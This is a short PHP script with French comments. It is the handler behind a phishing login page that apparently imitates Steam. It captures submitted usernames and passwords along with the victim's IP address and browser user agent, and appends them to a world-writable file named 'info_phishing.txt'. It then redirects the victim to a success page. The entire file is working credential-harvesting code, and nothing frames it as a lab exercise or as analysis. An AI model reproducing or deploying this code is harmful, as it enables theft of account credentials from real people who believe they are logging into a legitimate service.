<?php
// Débogage - Enregistre les tentatives dans les logs
error_log("Tentative de connexion reçue: " . $_POST['username']);

// Vérifier si le répertoire est accessible en écriture
if (!is_writable(__DIR__)) {
    error_log("ERREUR: Le répertoire " . __DIR__ . " n'est pas accessible en écriture");
}

// Date et heure actuelles
$date = date('Y-m-d H:i:s');

// Informations sur l'utilisateur
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Préparer les données à enregistrer
$data = "=== IDENTIFIANTS CAPTURÉS LE $date ===\n";
$data .= "Nom d'utilisateur: " . $_POST['username'] . "\n";
$data .= "Mot de passe: " . $_POST['password'] . "\n";
$data .= "Adresse IP: " . $ip . "\n";
$data .= "User-Agent: " . $user_agent . "\n";
$data .= "=================================\n\n";

// Créer le fichier info_phishing.txt avec les permissions adéquates s'il n'existe pas
if (!file_exists("info_phishing.txt")) {
    touch("info_phishing.txt");
    chmod("info_phishing.txt", 0666);
}

// Enregistrer les données dans le fichier info_phishing.txt
$result = file_put_contents("info_phishing.txt", $data, FILE_APPEND);

// Journaliser le résultat
if ($result === false) {
    error_log("ERREUR: Impossible d'écrire dans info_phishing.txt");
} else {
    error_log("Succès: Identifiants enregistrés dans info_phishing.txt (" . $result . " octets écrits)");
}

// Rediriger vers la page de confirmation au lieu de Steam directement
header('Location: success.php');
exit();
?>